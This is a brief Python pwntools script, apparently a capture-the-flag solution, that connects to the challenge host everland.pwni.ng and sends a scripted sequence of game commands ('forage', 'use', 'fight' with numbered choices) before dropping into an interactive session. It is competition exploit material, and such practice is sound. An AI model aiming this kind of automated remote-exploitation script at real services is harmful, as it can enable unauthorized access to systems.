from pwn import *
import sys

a = remote("everland.pwni.ng", "7772")

def s(d):
    sys.stdout.write(a.recv())
    a.sendline(d)


s("Pwn Master Zach")
s("forage")
s("forage")
s("forage")
s("forage")
s("use")
s("0")

for i in range(4):
    s("fight")
    s("2")


for i in range(4):
    s("fight")
    s("0")

s("use")
s("3")

for i in range(2):
    s("fight")
    s("3")

s("fight")
s("4")

for i in range(24):
    s("fight")
    s("0")

s("fight")
s("4")

a.interactive()
print a.recv()
